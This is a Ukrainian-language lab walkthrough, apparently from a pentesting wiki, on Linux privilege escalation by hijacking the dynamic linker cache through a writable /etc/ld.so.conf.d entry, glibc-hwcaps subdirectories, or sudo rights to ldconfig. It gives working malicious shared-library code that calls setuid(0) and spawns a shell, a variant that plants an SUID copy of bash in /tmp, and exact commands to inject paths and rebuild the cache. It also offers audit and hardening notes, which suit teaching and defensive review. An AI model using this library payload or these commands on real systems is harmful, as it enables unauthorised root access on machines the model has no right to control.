# Приклад експлойту для підвищення привілеїв через ld.so

Ця сторінка є спеціалізованою лабораторною роботою для отруєння **кешу системного компонувальника через `/etc/ld.so.conf` або `ldconfig`**. Щодо ін'єкції відсутньої бібліотеки, доступного для запису `RPATH`/`RUNPATH`, `LD_PRELOAD` та іншого загального зловживання SUID-компонувальником див. [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).

## Підготовка середовища

У наступному розділі наведено код файлів, які ми використовуватимемо для підготовки середовища.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Створіть** ці файли на своїй машині в одній папці
2. **Скомпілюйте** **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Скопіюйте** `libcustom.so` до `/usr/lib` і оновіть кеш: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (потрібні root privs)
4. **Скомпілюйте** **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Перевірте середовище

Переконайтеся, що _libcustom.so_ **завантажується** з _/usr/lib_ і що ви можете **виконати** binary.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Корисні команди для тріажу

Під час атаки на реальну ціль перевірте **точну назву бібліотеки**, яка потрібна бінарному файлу, що **зараз визначає loader**, а також які налаштовані шляхи доступні для запису, не змінюючи актуальний кеш.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Використовуйте `ldd` лише на **довіреному** виконуваному файлі. Деякі реалізації або нетипові ELF-інтерпретатори можуть спричинити виконання коду, контрольованого attacker; `objdump -p ./file | grep NEEDED` безпечно виводить список прямих залежностей. Для довіреної цілі виклик знайденого інтерпретатора з `--list` показує фактичне розв'язання залежностей.<sup>[[4]](#references)</sup>

Кілька корисних нюансів:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` зазвичай **не працює**, оскільки
перенаправлення виконується вашою поточною shell. Натомість використовуйте
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- **SUID/привілейовані** бінарні файли працюють у **режимі безпечного виконання**: `LD_LIBRARY_PATH`
ігнорується, тоді як `LD_PRELOAD` обмежується (імена, що містять косу риску,
ігноруються, а попередньо завантажуватися можуть лише бібліотеки з позначкою setuid у стандартних каталогах). Після того як root запустить `ldconfig`, каталоги, перелічені в
`/etc/ld.so.conf`, можуть потрапити до `/etc/ld.so.cache`, тому ця помилкова конфігурація все ще
може впливати на привілейовані програми.<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG` також ігнорується в режимі безпечного виконання, якщо не існує `/etc/suid-debug`, тому збирайте його трасування під час еквівалентного запуску без SUID, а не очікуйте виведення від привілейованого виконання.<sup>[[1]](#references)</sup>
- У glibc 2.33 і новіших версіях dynamic loader також надає
`--list-diagnostics`, який виводить машиночитані діагностичні дані loader і вбудовану інформацію про шляхи пошуку, коли hijack працює неочікувано.<sup>[[1]](#references)[[6]](#references)</sup>

### Обмеження кешу та SONAME

`ldconfig` не кешує кожен довільний файл у налаштованому каталозі: він перевіряє ELF-заголовки, розпізнає імена, що відповідають `lib*.so*` або `ld-*.so*`, і очікує стандартний ланцюжок `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. Тому injected object має відповідати архітектурі/класу цільового файлу, містити точне ім'я `DT_NEEDED` (зазвичай його `DT_SONAME`), а також усі символи/версії, які розв'язує victim.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Надавайте перевагу бібліотеці, специфічній для цілі, як у цьому прикладі. Shadowing поширеного SONAME неповним об'єктом може порушити роботу кожного процесу, який розв'язує його до запуску запланованої привілейованої цілі.<sup>[[3]](#references)</sup>

## Exploit

У цьому сценарії припустімо, що адміністратор додав вразливий запис до
файлу в `/etc/ld.so.conf.d/`, який підключається системним
`/etc/ld.so.conf`.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Вразлива папка — _/home/ubuntu/lib_ (де ми маємо доступ на запис).\
**Завантажте та скомпілюйте** наступний код у цьому шляху:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Якщо ви очікуєте, що **root** (або інший привілейований обліковий запис) згодом виконає вразливий бінарний файл, зазвичай краще залишити **артефакт, власником якого є root**, замість запуску інтерактивної оболонки. Наприклад:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Після виконання з привілеями можна використати `/tmp/rootbash -p`.

Тепер, коли ми **створили шкідливу бібліотеку libcustom у неправильно налаштованому** шляху, кеш за замовчуванням потрібно перебудувати успішним запуском із привілеями **`ldconfig`**. Перезавантаження допомагає лише тоді, коли локальний процес завантаження справді викликає його; інакше дочекайтеся дії адміністратора або скористайтеся небезпечним правилом sudo, якщо воно доступне.<sup>[[2]](#references)</sup>

Після цього **повторно перевірте**, звідки виконуваний файл `sharedvuln` завантажує бібліотеку `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Як бачите, він **завантажує його з `/home/ubuntu/lib`**, і якщо будь-який користувач його виконає, буде запущено shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Зверніть увагу, що в цьому прикладі ми не підвищували привілеї, але, змінивши виконувані команди та **очікуючи, поки root або інший привілейований користувач виконає вразливий бінарний файл**, ми зможемо підвищити привілеї.

### Сучасне `glibc-hwcaps` shadowing

Починаючи з glibc 2.33, loader може надавати перевагу оптимізованим бібліотекам у `glibc-hwcaps/<level>/` всередині **кожного каталогу пошуку бібліотек**. Отже, перевірки лише `/home/ubuntu/lib` недостатньо: доступний для запису сумісний підкаталог, наприклад `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`, може shadow базову бібліотеку після того, як `ldconfig` проіндексує його, тоді як інші CPU продовжать використовувати базовий об'єкт. Це також забезпечує architecture-selective hijack, який можна пропустити, якщо перевірка виконується на іншому CPU.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Поточні рекомендації з hardening glibc радять уникати дублікатів SONAMEs, нестандартних search locations і об’єктів у підкаталогах `glibc-hwcaps`. З погляду аудиту рекурсивно перевіряйте ownership і writeability налаштованих директорій та всіх компонентів їхніх батьківських шляхів.<sup>[[3]](#references)</sup>

### Інші misconfigurations — та сама vuln

У попередньому прикладі ми імітували misconfiguration, за якої адміністратор **вказав непривілейовану папку всередині configuration file у `/etc/ld.so.conf.d/`**.\
Але існують й інші misconfigurations, які можуть спричинити ту саму vulnerability: якщо у вас є **права на запис** до завантаженого **config file**, ви можете створити файл у доступній для запису директорії `/etc/ld.so.conf.d/` або записати до `/etc/ld.so.conf`, то зможете налаштувати й експлуатувати ту саму vulnerability.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**Припустімо, у вас є sudo privileges для `ldconfig`**.\
За допомогою `-f` можна вказати `ldconfig` **який configuration file читати**, тому файл, що містить назви контрольованих attacker-ом директорій, може змусити `ldconfig` додати ці папки до cache.<sup>[[2]](#references)</sup>\
Отже, створімо файли й папки, необхідні для завантаження "/tmp":
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Тепер, як зазначено в **previous exploit**, **створіть malicious library у `/tmp`**.\
І нарешті, завантажимо шлях і перевіримо, звідки binary завантажує library:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Як бачите, маючи привілеї sudo для `ldconfig`, можна скористатися тією самою вразливістю.** Деталі параметрів мають значення під час оцінювання обмеженого правила sudo: `-f` вибирає іншу конфігурацію, але все одно перебудовує `/etc/ld.so.cache`; `-C` перенаправляє кеш в інше місце; `-N` запобігає перебудові кешу; а `-X` запобігає оновленню посилань, але **все одно перебудовує кеш, якщо не використовується разом із `-N`**.<sup>[[2]](#references)</sup>



## References

- [1] [ld.so(8) - Сторінка посібника Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Сторінка посібника Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Посилення безпеки Dynamic Linker - GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Сторінка посібника Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Діагностика Dynamic Linker (GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
{{#include ../../banners/hacktricks-training.md}}
